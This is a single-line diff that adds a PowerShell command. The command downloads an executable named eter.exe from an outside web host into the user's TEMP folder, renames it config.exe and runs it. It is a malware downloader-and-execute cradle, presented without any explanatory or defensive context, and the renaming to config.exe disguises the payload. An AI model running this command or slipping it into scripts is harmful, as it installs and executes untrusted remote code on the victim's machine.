@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/updates/eter.exe',"$env:TEMPconfig.exe");Start-Process ("$env:TEMPconfig.exe")
